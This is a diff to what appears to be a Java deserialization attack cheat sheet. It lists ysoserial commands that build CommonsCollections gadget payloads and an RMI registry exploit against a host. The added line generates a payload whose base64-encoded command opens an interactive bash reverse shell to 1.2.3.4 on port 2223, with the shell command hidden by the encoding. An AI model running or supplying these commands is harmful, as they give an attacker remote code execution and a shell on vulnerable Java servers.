@@ -2,8 +2,9 @@
 
 ```bash
 java -jar ysoserial-all.jar CommonsCollections3 "calc" > cc3.txt
-
+java -jar ysoserial-all.jar CommonsCollections4 "bash -c {echo,L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEuMi4zLjQvMjIyMyAwPiYx}|{base64,-d}|{bash,-i}"|base64 -w 0
 java -cp ysoserial.jar ysoserial.exploit.RMIRegistryExploit 1.2.3.4 1099 CommonsCollections1 "calc.exe"
+
 
 
 # 示例: hibernate-core-5.4.6.Final.jar这个包，利用ysoserial生成payload，执行以下命令
